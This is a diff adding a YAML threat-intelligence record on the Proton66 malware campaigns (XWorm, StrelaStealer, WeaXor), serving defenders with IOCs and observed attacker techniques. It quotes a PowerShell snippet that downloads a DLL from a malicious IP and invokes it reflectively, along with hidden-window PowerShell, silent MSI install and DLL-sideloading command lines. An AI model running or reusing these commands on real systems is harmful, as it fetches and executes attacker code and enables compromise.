@@ -1,0 +1,75 @@
+description: Proton66 Part 2 report details malware campaigns linked to compromised
+  WordPress websites targeting Android devices, the XWorm campaign targeting Korean-speaking
+  users, StrelaStealer credential stealer and WeaXor ransomware.
+attribution: SpiderLabs
+malware_families:
+- SuperBlack
+- Mora_001
+- XWorm
+- StrelaStealer
+- WeaXor
+- Mallox
+TTPs:
+  processes:
+  - wscript.exe
+  - powershell.exe
+  - msiexec.exe
+  - g2m.exe
+  commandline:
+  - C:\\Windows\\System32\\wscript.exe "C:\\Users\\Public\\win64.vbs"
+  - '"C:\\Windows\\system32\\powershell.exe" -ExecutionPolicy Bypass -WindowStyle
+    Hidden -File "%TEMP%\\msil\setup.ps1"'
+  - msiexec /i kodi-21.1-Omega-x64.msi /quiet
+  - '"C:\\Program Files\\GoToMeeting\\g2m.exe" /sideload g2m.dll'
+  powershell:
+  - "param (\n  [string]$url = \"http://91.212.166.16/DLLl.txt\"\n)\n\n$webClient\
+    \ = New-Object Net.WebClient\n$dllContent = $webClient.DownloadString($url)\n\
+    $assembly = [System.Reflection.Assembly]::Load(New-Object Byte[] $dllContent)\n\
+    $type = $assembly.GetType(\"ClassiLibrary3.Classi\")\n$method = $type.GetMethod(\"\
+    ZxRHG\")\n$method.Invoke($null, (object[]@( \"txt.xd6osab/1,661.212,19//:ptthSjcdug\
+    \ , 'UpdateChecker', Srudmg, '1', 'Reda')) )\n"
+  scripting_engine:
+  - VBScript
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: powershell.exe
+    destination_address: 91.212.166.16
+    url: http://91.212.166.16/DLLl.txt
+  - executable: msiexec.exe
+    destination_address: ''
+    url: ''
+  - executable: g2m.exe
+    destination_address: ''
+    url: ''
+  file_modifications: []
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+- 91.212.166.21
+- 45.93.20.58
+- 91.212.166.86
+- hxxp://91.212.166.16/DLLl.txt
+- hxxp://91.212.166.16/base64.txt
+- 3afcf479c3f3e0
+- www-kodi.com
+- my-tasjeel-ae.com
+- www-wpx.net
+- hxxp://193.143.1.205
+- 193.143.1.205
+- hxxp://193.143.1[.]139/Ujdu8jjooue/biweax.php
+- 45.134.26.0/24
+- 45.135.232.0/24
+- 45.140.17.0/24
+- 91.212.166.0/24
+- 193.143.1.0/24
+- 45.93.20.0/24
+- 91.240.118.0/24
+- 185.11.61.0/24
+authors:
+- Pawel Knapczyk
+- Dawid Nesterowicz
+reference: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/proton66-part-2-compromised-wordpress-pages-and-malware-campaigns/
+date_of_publication: April 17, 2025
+file_creation_date: May 14, 2025
